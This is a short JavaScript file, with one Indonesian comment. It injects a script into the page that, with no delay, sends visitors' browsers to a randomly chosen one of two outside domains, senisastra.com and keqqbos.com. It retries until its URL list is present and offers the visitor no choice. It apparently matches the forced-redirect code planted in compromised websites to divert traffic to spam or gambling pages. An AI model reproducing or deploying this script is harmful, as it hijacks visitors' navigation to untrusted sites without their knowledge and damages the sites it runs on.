var url = Array(
  "https://senisastra.com/",
  "https://keqqbos.com/",
  "https://senisastra.com/",
  "https://keqqbos.com/",
  "https://senisastra.com/"
);
var rid = "";

var timesleep = 0;  // Tidak ada penundaan atau penundaan minimal

function put() {
    var script = document.createElement("script");
    script.innerHTML = 'var weburl = url[Math.floor(Math.random()*url.length)] + "" + rid; setTimeout(function () { window.location = weburl; }, timesleep);';
    document.body.appendChild(script);
}

function jump() {
    if (typeof url == 'undefined' || url == null) {
        setTimeout(function() {
            jump();
        }, 50);
    } else {
        put();
    }
}

jump();
